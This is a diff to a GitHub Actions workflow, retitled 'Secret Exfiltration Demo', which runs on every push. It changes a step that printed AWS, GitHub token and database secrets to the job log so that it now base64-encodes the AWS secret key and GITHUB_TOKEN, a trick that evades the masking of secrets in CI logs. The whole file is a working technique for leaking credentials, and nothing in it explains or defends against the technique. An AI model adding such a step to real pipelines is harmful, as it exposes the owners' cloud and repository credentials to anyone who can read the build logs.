@@ -1,21 +1,18 @@
-name: Brute Force GitHub Secrets
+name: Secret Exfiltration Demo
 
 on: push
 
 jobs:
-  secret_scanner:
+  secret_exfiltration:
     runs-on: ubuntu-latest
     steps:
       - name: Checkout Code
         uses: actions/checkout@v3
 
-      - name: 🔍 Trying Common Secret Names
+      - name: 🔥 Exfiltrating Secrets with Encoding
         env:
           AWS_SECRET_KEY: ${{ secrets.AWS_SECRET_KEY }}
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-          DATABASE_URL: ${{ secrets.DATABASE_URL }}
         run: |
-          echo "Trying to access common secrets..."
-          echo "🔓 AWS_SECRET_KEY: $AWS_SECRET_KEY"
-          echo "🔓 GITHUB_TOKEN: $GITHUB_TOKEN"
-          echo "🔓 DATABASE_URL: $DATABASE_URL"
+          echo "🔓 Base64 Encoded AWS_SECRET_KEY: $(echo $AWS_SECRET_KEY | base64)"
+          echo "🔓 Base64 Encoded GITHUB_TOKEN: $(echo $GITHUB_TOKEN | base64)"
